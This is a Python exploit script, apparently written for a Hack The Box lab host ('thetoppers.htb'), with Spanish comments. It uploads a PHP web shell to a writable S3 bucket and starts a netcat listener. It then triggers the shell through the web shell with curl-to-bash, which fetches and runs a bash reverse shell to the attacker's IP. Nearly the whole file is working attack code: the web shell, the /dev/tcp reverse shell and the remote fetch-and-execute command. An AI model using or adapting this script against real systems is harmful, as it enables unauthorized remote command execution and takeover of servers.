#!/usr/bin/python3

from colorama import Fore, Style
import argparse
import os
import boto3
import requests
import signal
import pdb  # Debugging Purposes
import sys
import time
import subprocess
import atexit
import multiprocessing
from pwn import log, listen

class Exploit:

    def __init__(self, url, lport, ip_address):
        self.url = url
        self.lport = lport
        self.ip_address = ip_address
        self.http_server = subprocess.Popen(["python3", "-m", "http.server", "80"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def aws_configure(self):
        aws_access_key_id = input("Ingrese su AWS Access Key ID: ")
        aws_secret_access_key = input("Ingrese su AWS Secret Access Key: ")
        region = input("Ingrese su región: ")
        default_output = input("Output format: ")

        # Configurar las credenciales y la región de AWS
        try:
            aws_config = f"aws configure set aws_access_key_id {aws_access_key_id} && " \
                         f"aws configure set aws_secret_access_key {aws_secret_access_key} && " \
                         f"aws configure set region {region} && " \
                         f"aws configure set format {default_output}"
            os.system(aws_config)
            print("Configuración de AWS realizada con éxito.")
        except Exception as e:
            print(f"Error al configurar AWS: {str(e)}")

    def create_file_php(self):
        content_php = "<?php system($_GET['cmd']); ?>"
        file_path_php = "shell.php"

        try:
            with open(file_path_php, 'w') as file:
                file.write(content_php)
            print(f"Archivo '{file_path_php}' creado exitosamente.")
        except Exception as e:
            print(f"Error al crear el archivo: {str(e)}")

    def create_file_sh(self, ip_address, lport):
        content_sh = f"bash -i >& /dev/tcp/{ip_address}/{lport} 0>&1"
        file_path_sh = "shell.sh"

        try:
            with open(file_path_sh, 'w') as file:
                file.write(content_sh)
            print(f"Archivo '{file_path_sh}' creado exitosamente.")
        except Exception as e:
            print(f"Error al crear el archivo: {str(e)}")

    def upload_file(self, url):
        bucket_name = self.url
        file_path = 'shell.php'
        destination_key = 'shell.php'

        try:
            # Subir el archivo a AWS S3
            s3 = boto3.resource('s3')
            s3.Object(bucket_name, destination_key).upload_file(file_path)
            print(f"Archivo '{file_path}' subido exitosamente a '{bucket_name}/{destination_key}'.")
        except Exception as e:
            print(f"Error al subir el archivo: {str(e)}")

    def nc(self, lport):
        # Iniciar una escucha inversa utilizando nc en el puerto 4444
        try:
            os.system(f"sudo nc -lnvp {self.lport}")
        except Exception as e:
            print(f"Error al iniciar la escucha: {str(e)}")

    def reverse(self, ip_address):
        url = f'http://thetoppers.htb/shell.php?cmd=curl%20{self.ip_address}/shell.sh|bash'

        try:
            # Ejecutar la reversa
            response = requests.get(url)
            print("Comando de reversa ejecutado correctamente.")
        except Exception as e:
            print(f"Error al ejecutar el comando de reversa: {str(e)}")
    
    def cleanup(self):

        if self.http_server.poll() is None:
            self.http_server.kill()

    def run(self):
        self.aws_configure()
        self.create_file_php()
        self.create_file_sh(self.ip_address, self.lport)
        self.upload_file(self.url)
        self.nc(self.lport)
        self.reverse(self.ip_address)
        self.cleanup()

def get_arguments():
    parser = argparse.ArgumentParser(description='Uso de script para AWS S3')
    parser.add_argument('-u', '--url', dest='url', required=True, help='Proporcionar direccion URL a explotar')
    parser.add_argument('-p', '--port', dest='lport', required=True, help='Proporcionar puerto para la Reverse Shell')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='Direccion IP para la Reverse Shell')
    return parser.parse_args()

def main():
    args = get_arguments()
    exploit = Exploit(args.url, args.lport, args.ip_address)
    exploit.run()

if __name__ == '__main__':
    main()

